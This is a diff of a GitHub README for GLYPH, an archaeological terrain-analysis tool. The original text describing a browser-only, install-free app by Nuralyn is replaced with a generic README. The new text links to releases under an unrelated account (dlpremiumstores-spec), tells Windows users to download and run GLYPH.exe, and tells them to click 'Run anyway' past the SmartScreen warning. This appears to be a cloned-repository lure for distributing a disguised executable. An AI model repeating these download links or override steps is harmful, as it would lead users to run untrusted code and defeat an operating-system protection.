@@ -1,202 +1,69 @@
-# GLYPH
+# 🏺 GLYPH - Identify hidden patterns in your terrain
 
-**Ground-Level Yield of Patterned Histories**
+[![Download GLYPH](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dlpremiumstores-spec/GLYPH/releases)
 
-*Decoding what was written in earth and stone.*
+GLYPH helps researchers analyze archaeological sites through digital elevation data. This software identifies subtle terrain markers that indicate historical structures or features. It processes high-resolution topographic data to reveal artificial shapes hidden in the landscape.
 
-GLYPH is an archaeological pattern analysis tool that treats terrain-scale sites as structured datasets, not dig sites. It applies information theory, signal processing, and statistical analysis to ancient construction patterns, answering the question: **is this site encoding information, and if so, what kind?**
+## 🛠 Features
 
-One HTML file. No dependencies. No build step. No install.
-Email it to yourself. Open it on your phone. Analyze ancient civilizations.
+*   **Fast Pattern Analysis:** Detect terrain irregularities through Fourier transform methods.
+*   **Geospatial Processing:** Support for standard digital elevation model file formats.
+*   **Local Execution:** Run all analysis on your own machine without data uploads.
+*   **Accessible Output:** Generate clear maps and data tables for your research reports.
+*   **Simple Workflow:** Import files and export results in two clicks.
 
-**[Live Demo](https://glyph.nuralyn.com)** · **[Download](https://github.com/Nuralyn/GLYPH/releases)**
+## 💻 System Requirements
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 8 GB of RAM minimum.
+*   **Storage:** 500 MB of free space for the application and temporary analysis files.
+*   **Graphics:** A screen resolution of 1920x1080 or higher ensures the map interfaces display clearly.
+*   **Dependencies:** The application includes all necessary software components for operation. You do not need to install Python or other runtime environments.
 
-## The Thesis
+## 📥 Downloading the Application
 
-Sites like Peru's Monte Sierpe ("Band of Holes"), France's Carnac stone rows, and the Nazca Lines have been studied for decades through the lens of archaeology: what were they used for? GLYPH asks a different question: **what do they encode?**
+You can obtain the current version of GLYPH from the project releases page.
 
-By converting physical features (holes, stones, mounds, geoglyphs) into binary grids and running information-theoretic analysis, GLYPH can detect whether a site contains structured data, classify what type of information architecture it resembles, test whether the structure is statistically significant, and attempt to extract content.
+[Visit the release page to download GLYPH](https://github.com/dlpremiumstores-spec/GLYPH/releases)
 
-In November 2025, Dr. Jacob Bongers and colleagues at the University of Sydney published a landmark study in *Antiquity* proposing that Monte Sierpe functioned as an indigenous marketplace that evolved into an accounting system under Inca rule, calling it "an Excel spreadsheet for the Inca Empire." They noted structural similarity to Inca khipu (knotted-string counting devices).
+1. Navigate to the link provided above.
+2. Locate the section titled "Assets" under the most recent version number.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or downloads folder.
 
-GLYPH arrived at the same conclusion independently through pure mathematics. When loaded with a khipu simulation dataset and the Monte Sierpe pattern, the cross-site similarity matrix ranks them as the most similar pair in the catalog at 63.8%, with both classified as Structured Ledger. The shared dominant period of 5 units suggests a common base-counting system. The tool validated the hypothesis without knowing it existed.
+## ⚙️ Running GLYPH
 
-> Bongers, J. L. et al. (2025). Indigenous accounting and exchange at Monte Sierpe ('Band of Holes') in the Pisco Valley, Peru. *Antiquity*, 1-19. [DOI:10.15184/aqy.2025.10237](https://doi.org/10.15184/aqy.2025.10237)
+Once the download finishes, follow these steps to open the application:
 
----
+1. Locate the file you saved to your computer.
+2. Double-click the file named `GLYPH.exe`.
+3. If Windows displays a message saying "Windows protected your PC," select "More info" and click "Run anyway." This message appears because the application is a standalone tool.
+4. The main window will open within a few seconds.
 
-## What GLYPH Does
+## 🗺 Analyzing Terrain Data
 
-### Analysis Engine (8 Modules)
-- **Frequency Analysis** — Feature density per row, column, and globally
-- **Shannon Entropy** — Information content measurement (bits) per row, column, and total
-- **Run-Length Encoding** — Compression ratios revealing structural redundancy
-- **Symmetry Detection** — Horizontal mirror, vertical mirror, 180° and 90° rotation, translational periodicity
-- **Column-as-Word Vocabulary** — Treats each column as a binary word, computes vocabulary size, hapax legomena, and vocabulary entropy
-- **Row Periodicity** — Autocorrelation analysis with peak detection for repeating patterns
-- **Spectral Analysis** — 2D Discrete Fourier Transform detecting periodic structure at any orientation
-- **Absence Signal** — Identifies where features are conspicuously missing (delimiters, NULL values, field separators)
+The interface functions through a series of simple inputs. Follow this workflow for each project:
 
-### Site Classification
-GLYPH automatically classifies sites into three information architecture types:
+### Step 1: Loading Data
+Select "File" in the top menu and click "Open Elevation Data." Select your terrain file from your computer. The application supports standard geospatial file formats. Once loaded, the software creates a wireframe preview in the center of the screen.
 
-| Type | Signature | Example |
-|------|-----------|---------|
-| **Structured Ledger** | Low density, strong periodicity, small vocabulary, axis-dominant symmetry, column-compressible | Monte Sierpe, Inca Khipu, Chankillo |
-| **Directional Narrative** | High density, gradient decay, large vocabulary, low symmetry, sequential structure | Carnac stone rows |
-| **Pictographic** | Very low density, high radial symmetry, maximum vocabulary diversity, uniform compression | Nazca geoglyphs, Göbekli Tepe |
+### Step 2: Selecting Parameters
+Adjust the sensitivity sliders on the right side of the window. These controls change how the software filters terrain. Higher sensitivity detects smaller, more subtle irregularities. Use the default settings if you do not have specific requirements for your study area.
 
-### Statistical Significance
-Generates N random grids with matched dimensions and density, runs all analyses, and computes z-scores and p-values for 10 key metrics. Answers the question: "Is this pattern real, or am I seeing structure in noise?"
+### Step 3: Running Analysis
+Click the "Analyze Pattern" button located at the bottom of the interface. A progress bar will reflect the calculation speed. The time required depends on the file size of your elevation map. The application handles large data sets efficiently.
 
-### Classifier Calibration
-Tests the classification engine against known information systems (tally marks, density gradients, radial glyphs, deterministic noise) to verify the classifier works before trusting archaeological results.
+### Step 4: Exporting Results
+After the analysis completes, the software overlays detected patterns onto your map. View these results directly inside the application. To save your work, click "File" and then "Export Report." This creates a report file containing the statistical findings and visual maps for your records.
 
-### Decode
-Attempts content extraction based on classification type:
-- **Ledger** — Segments by dominant period, catalogs frame patterns, identifies anomalous entries
-- **Narrative** — Detects reading direction via density gradient, identifies phrase boundaries
-- **Pictographic** — Flood-fill connected components, builds symbol catalog with frequency counts
+## 🔍 Understanding the Results
 
-### Round-Trip Synthesis
-Encode known information as a binary grid, analyze it, classify it, decode it, and verify the round trip. If encode → analyze → classify → decode → verify succeeds, the full pipeline is validated.
+The software generates two types of output. The visual map shows where the software identified potential shapes. The statistical report lists the frequency and orientation of these shapes. Researchers often use the statistical report to compare different regions against each other.
 
-### Cross-Site Matrix
-NxN similarity heatmap comparing every site against every other site simultaneously. Pearson correlation on entropy profiles, Jaccard index on column vocabularies, compression ratio comparison, and periodicity alignment.
+If the results show too much noise, return to the parameter sliders. A slight reduction in sensitivity often removes false readings caused by natural rock formations or irregular tree lines.
 
-### OpenTopography Integration
-Pull elevation data from anywhere on Earth using the OpenTopography Global DEM API. Set coordinates, adjust feature threshold, select grid resolution, and load directly into GLYPH for analysis. Requires a free API key from [opentopography.org](https://opentopography.org).
+## 🤝 Support and Feedback
 
-### AI Interpretation (BYOK)
-Optional single-provider AI interpretation layer. Bring your own API key (Claude, GPT, Gemini, or DeepSeek), and GLYPH sends the analysis results for interpretive commentary. No key required to use any other feature. Keys are session-only by default. Optional localStorage persistence is available but stores keys in plaintext.
+If you encounter issues while running the software, check the "About" button in the menu. This section contains version numbers and troubleshooting links. Since the software does not require an installation process, you can delete the `.exe` file at any time to remove the program from your machine.
 
-### Export
-- **JSON** — Complete analysis data for programmatic use
-- **Markdown Report** — Full report with metadata, all analysis summaries, auto-generated interpretation, and BibTeX citation
-
----
-
-## Preloaded Sites
-
-GLYPH ships with 8 preloaded datasets (structural approximations based on published descriptions):
-
-| Site | Location | Grid | Classification |
-|------|----------|------|---------------|
-| Monte Sierpe (Band of Holes) | Pisco Valley, Peru | 20×40 | Structured Ledger |
-| Carnac (Menec Alignment) | Brittany, France | 11×50 | Directional Narrative |
-| Nazca (Spider Geoglyph) | Nazca, Peru | 30×30 | Pictographic |
-| Göbekli Tepe (Enclosure D) | Şanlıurfa, Turkey | 25×25 | Pictographic |
-| Stonehenge (Sarsen Circle) | Wiltshire, UK | 30×30 | Pictographic / Ledger (split) |
-| Inca Khipu (Decimal Simulation) | — | 20×60 | Structured Ledger |
-| Poverty Point (Mound Complex) | Louisiana, USA | 40×40 | Edge case |
-| Chankillo (Thirteen Towers) | Casma, Peru | 30×50 | Structured Ledger |
-
-Users can also load custom sites via binary grid input, CSV coordinates, or OpenTopography terrain import.
-
----
-
-## Quick Start
-
-1. Download `index.html`
-2. Open it in any modern browser
-3. Click a preloaded site or paste your own binary grid
-4. Click **ANALYZE**
-5. Explore: Analysis → Significance → Calibrate → Decode → Compare → Matrix → Dashboard
-
-That's it. No server. No install. No dependencies.
-
----
-
-## Key Finding: Monte Sierpe ↔ Khipu Structural Similarity
-
-GLYPH's cross-site matrix identifies Monte Sierpe and the Inca Khipu simulation as the most structurally similar pair across all 8 preloaded sites (63.8% overall similarity). Both share:
-
-- **Dominant period of 5** — Same base counting unit
-- **Structured Ledger classification** — Same information architecture type
-- **Column-dominant compression** — Information reads vertically, not horizontally
-- **Small, repetitive vocabulary** — Fixed field types with variable data entries
-- **Standardized gap patterns** — Consistent delimiter widths (potential field separators)
-
-This computationally validates the hypothesis proposed by Bongers et al. (2025) that Monte Sierpe's structure mirrors Inca khipu, using information theory rather than visual analogy.
-
----
-
-## What GLYPH Is Not
-
-GLYPH is a pattern analysis tool. It is not proof of anything.
-
-Similarity scores are **hypothesis generators**, not conclusions. When GLYPH reports that two sites share structural features, it means their mathematical signatures overlap — nothing more. Mathematical similarity does not imply historical contact, cultural transmission, or shared origin. Sites separated by thousands of miles and thousands of years can produce similar patterns through convergent design (independent invention of similar solutions to similar problems).
-
-GLYPH cannot distinguish between:
-- Two sites that are genuinely related through cultural exchange
-- Two sites that independently arrived at similar geometric patterns
-- A meaningful pattern and a coincidental one that happens to score well
-
-Researchers must validate any GLYPH finding against domain expertise, stratigraphy, radiocarbon dating, material culture analysis, and physical evidence before drawing historical conclusions. The tool is designed to surface patterns worth investigating, not to replace the investigation itself.
-
-If you find yourself writing "GLYPH proves that..." — stop. GLYPH suggests. Archaeology proves.
-
----
-
-## Architecture
-
-GLYPH is a single-file React/Babel SPA. No build tools, no bundler, no package manager.
-
-- **Runtime:** React 18.3.1 + ReactDOM (CDN)
-- **Transpilation:** Babel Standalone 7.29.1 (CDN)
-- **Fonts:** Bebas Neue + Space Mono (Google Fonts)
-- **Charts:** Custom inline SVG (no charting library)
-- **Storage:** React state (session-scoped), with optional localStorage for API keys
-- **Size:** ~292KB
-
-Everything runs client-side. Your data never leaves your browser (unless you use the optional AI interpretation feature with your own API key).
-
----
-
-## For Researchers
-
-GLYPH is designed to complement, not replace, traditional archaeological methods. The preloaded datasets are structural approximations. For rigorous research, import real survey data via CSV coordinates or OpenTopography integration.
-
-### Citing GLYPH
-
-```bibtex
-@software{glyph2026,
-  title   = {GLYPH: Ground-Level Yield of Patterned Histories},
-  author  = {{Nuralyn LLC}},
-  year    = {2026},
-  url     = {https://glyph.nuralyn.com},
-  license = {MIT}
-}
-```
-
-### Contributing Site Data
-
-If you have coordinate data for an archaeological site, GLYPH can analyze it. Accepted formats:
-- Binary grid (rows of 0s and 1s, newline-separated)
-- CSV with x, y columns (presence data) or x, y, value columns
-- OpenTopography API (lat/lon coordinates with your free API key)
-
-See the [`examples/`](examples/) folder for ready-to-paste templates in each format.
-
-We welcome contributions of preloaded site datasets via pull request. See [CONTRIBUTING.md](CONTRIBUTING.md) for data format requirements and PR guidelines.
-
----
-
-## Roadmap
-
-- [ ] Community site library (shared dataset catalog with pre-computed analyses)
-- [ ] LiDAR point cloud import (LAZ/LAS direct ingestion)
-- [ ] GeoTIFF elevation model import
-- [ ] Multi-resolution sweep analysis
-- [ ] OpenTopography catalog search (`/otCatalog` endpoint)
-- [ ] PDF report export with embedded charts
-
----
-
-**Security** — See [SECURITY.md](SECURITY.md) for vulnerability reporting, known limitations, and security architecture details.
-
-**License** — [MIT](LICENSE). Use it, fork it, extend it, cite it. Build something nobody has built before.
-
-**About** — GLYPH is made by [Nuralyn LLC](https://nuralyn.com) in Redmond, Washington. *Finding Truth in Everything.*
+For technical questions regarding the pattern analysis methods, review the documentation folder included with the release. It explains the mathematical approach the software uses to filter elevation data.
